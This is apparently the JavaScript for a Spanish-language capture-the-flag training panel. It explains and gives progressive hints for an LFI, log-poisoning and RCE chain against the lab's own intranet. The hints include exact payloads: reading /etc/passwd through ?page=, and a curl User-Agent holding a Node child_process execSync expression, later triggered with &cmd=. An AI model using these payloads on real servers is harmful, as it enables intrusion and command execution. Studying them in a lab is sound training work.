// Guía del reto (panel lateral). Explica cada etapa, da pistas PROGRESIVAS
// (primero un empujón conceptual, luego el comando exacto) y detecta el
// progreso real con polling a /status.
(function () {
  const guia = document.getElementById('guia');
  const room = guia.dataset.room;
  const log = guia.dataset.logpath;          // /var/log/lab/<sala>.log
  const host = location.origin;

  const ETAPAS = [
    {
      key: 'visited',
      titulo: 'Reconoce el sitio',
      quehaces: 'Navega la intranet con el menú (Inicio, Comunicados, Directorio, Soporte TI, Acerca de).',
      observar: 'Mira cómo cambia la URL al moverte y que hay valores que se calculan solos (fecha, año).',
      porque: 'Ese contenido lo decide un parámetro que tú controlas, y los valores dinámicos sugieren que el sitio EVALÚA expresiones.',
      real: 'Un atacante mapea la app con un proxy (Burp/ZAP) y anota cada parámetro antes de tocar nada.',
      hints: [
        'Pasea por todas las secciones del menú. ¿Qué parte de la URL cambia en cada una?',
        'Fíjate en el parámetro <code>?page=</code>. Y lee la sección <b>Soporte TI</b>: el equipo dejó notas útiles.'
      ]
    },
    {
      key: 'lfi',
      titulo: 'Lee archivos del sistema (LFI)',
      quehaces: 'Apunta ?page= a una ruta del sistema en vez de a una página del sitio.',
      observar: 'El contenido de un archivo del servidor que no debería ser accesible.',
      porque: 'El visor abre el archivo que pides sin validar la ruta (Local File Inclusion / path traversal).',
      real: 'No se prueba “todo el disco”: se usa una ruta canónica como /etc/passwd solo para confirmar el fallo.',
      hints: [
        'Si el visor carga el archivo que le pidas… ¿qué pasa si le pides uno del sistema en vez de una página?',
        'Para VER el archivo crudo (sin que el visor lo interprete), añade <code>&raw=1</code>.',
        'Prueba: <code>' + host + '/?room=' + room + '&page=/etc/passwd&raw=1</code>'
      ]
    },
    {
      key: 'logIncluded',
      titulo: 'Encuentra y lee el log',
      quehaces: 'Ubica el archivo de log donde el sitio registra tus visitas y ábrelo con el visor.',
      observar: 'Tus propias líneas de acceso, cada una con TU User-Agent.',
      porque: 'Confirmas dos cosas: puedes LEER ese log y además CONTROLAS parte de lo que se escribe en él (tu User-Agent).',
      real: 'Tras confirmar el LFI, el atacante enumera dirigido: busca .env, código fuente y logs donde suelen vivir.',
      hints: [
        '¿Dónde dijo el sitio que se registran las visitas? (lo leíste en Soporte TI).',
        'Léelo en crudo: <code>' + host + '/?room=' + room + '&page=' + log + '&raw=1</code>'
      ]
    },
    {
      key: 'poisoned',
      titulo: 'Envenena el log',
      quehaces: 'Haz una petición cuyo User-Agent, en vez de un navegador, sea una EXPRESIÓN ${...} que el visor sepa evaluar.',
      observar: 'Al releer el log en crudo, tu línea ahora contiene esa expresión.',
      porque: 'Unes las piezas: el log guarda tu entrada sin filtrar y el visor evalúa expresiones. Dejas la “carga” esperando.',
      real: 'El payload no se adivina: se construye porque ya se leyó el código/motor en la fase anterior.',
      hints: [
        'Necesitas poner un ${...} con JavaScript dentro de tu User-Agent. ¿Qué herramienta te deja fijar el User-Agent? (curl -A).',
        'Usa comillas simples para que tu shell no lo expanda; debe llegar literal al log.',
        'curl -A \'${require("child_process").execSync(cmd).toString()}\' "' + host + '/?room=' + room + '"'
      ]
    },
    {
      key: 'rce',
      titulo: 'Consigue RCE',
      quehaces: 'Pide al visor que RENDERICE el log (sin raw) pasándole además un comando con &cmd=.',
      observar: 'La salida del comando aparece en la página (p. ej. la identidad del usuario del proceso).',
      porque: 'Al renderizar, el visor evalúa la expresión que guardaste y ejecuta tu comando: eso es RCE.',
      real: 'RCE no es el final: seguirían persistencia, movimiento lateral o escalar privilegios, con el menor ruido posible.',
      hints: [
        'Ahora NO uses raw: deja que el visor interprete el log. ¿Cómo le pasas el comando a ejecutar?',
        host + '/?room=' + room + '&page=' + log + '&cmd=id'
      ]
    },
    {
      key: 'solved',
      titulo: 'Captura la flag',
      quehaces: 'Ejecuta, a través de tu RCE, el generador de flags pasándole el nombre de tu sala, y envía el FLAG{...}.',
      observar: 'Aparece tu FLAG{...}; pégala abajo y pulsa Validar.',
      porque: 'La flag no es un archivo de texto: la produce un programa que puedes EJECUTAR pero no LEER. Un LFI no bastaba; por eso necesitabas RCE.',
      real: 'La flag equivale al objetivo real: leer un secreto, exfiltrar datos o tomar control.',
      hints: [
        'El binario se llama getflag y recibe tu sala como argumento. Córrelo con tu RCE.',
        host + '/?room=' + room + '&page=' + log + '&cmd=getflag ' + room
      ]
    }
  ];

  const ol = document.getElementById('etapas');
  ETAPAS.forEach((e, i) => {
    const li = document.createElement('li');
    li.className = 'etapa';
    li.id = 'etapa-' + e.key;
    const hintsHtml = e.hints
      .map((h, j) => '<div class="pista" data-h="' + j + '" hidden>' + h + '</div>')
      .join('');
    li.innerHTML =
      '<div class="etapa-top"><span class="num">' + (i + 1) + '</span>' +
      '<div><div class="titulo">' + e.titulo + '</div>' +
      '<div class="bloque"><b>Qué haces:</b> ' + e.quehaces + '<br>' +
      '<b>Qué observar:</b> ' + e.observar + '<br>' +
      '<b>Por qué funciona:</b> ' + e.porque + '</div>' +
      '<div class="real"><b>En la vida real:</b> ' + e.real + '</div>' +
      '<details class="pistas"><summary>Ver pista</summary>' + hintsHtml +
      '<button class="mas" data-key="' + e.key + '">Mostrar primera pista</button>' +
      '</details></div></div>';
    ol.appendChild(li);
  });

  // Pistas progresivas: cada click revela una más.
  ol.addEventListener('click', (ev) => {
    const b = ev.target.closest('.mas');
    if (!b) return;
    const li = b.closest('.etapa');
    const ocultas = li.querySelectorAll('.pista[hidden]');
    if (ocultas.length) {
      ocultas[0].hidden = false;
      const quedan = li.querySelectorAll('.pista[hidden]').length;
      b.textContent = quedan ? 'Necesito otra pista' : 'No hay más pistas';
      if (!quedan) b.disabled = true;
    }
  });

  function pintar(st) {
    let hechas = 0;
    let activaPuesta = false;
    ETAPAS.forEach((e, idx) => {
      const li = document.getElementById('etapa-' + e.key);
      li.classList.remove('done', 'activa');
      const num = li.querySelector('.num');
      if (st[e.key]) { li.classList.add('done'); num.textContent = '✓'; hechas++; }
      else { num.textContent = idx + 1; if (!activaPuesta) { li.classList.add('activa'); activaPuesta = true; } }
    });
    document.getElementById('prog').textContent = hechas + '/' + ETAPAS.length;
    document.getElementById('exito').hidden = !st.solved;
  }

  async function refrescar() {
    try {
      const st = await fetch('/status?room=' + encodeURIComponent(room)).then((r) => r.json());
      pintar(st);
    } catch (e) { /* reintenta */ }
  }

  // Abrir/cerrar el panel
  const btn = document.getElementById('missionBtn');
  const cerrar = document.getElementById('closeGuia');
  btn.addEventListener('click', () => { guia.hidden = !guia.hidden; if (!guia.hidden) refrescar(); });
  cerrar.addEventListener('click', () => { guia.hidden = true; });

  // Validación de flag
  const fb = document.getElementById('flagBtn');
  const fi = document.getElementById('flagInput');
  const fm = document.getElementById('flagMsg');
  fb.addEventListener('click', async () => {
    const flag = fi.value.trim();
    if (!flag) return;
    fm.textContent = 'Validando…';
    try {
      const res = await fetch('/check?room=' + encodeURIComponent(room) + '&flag=' + encodeURIComponent(flag)).then((r) => r.json());
      fm.textContent = res.ok ? '✅ ¡Correcto!' : '❌ Flag incorrecta.';
      fm.className = 'flagmsg ' + (res.ok ? 'ok' : 'bad');
      if (res.ok) refrescar();
    } catch (e) { fm.textContent = 'Error de red, reintenta.'; }
  });

  refrescar();
  setInterval(refrescar, 3000);
})();
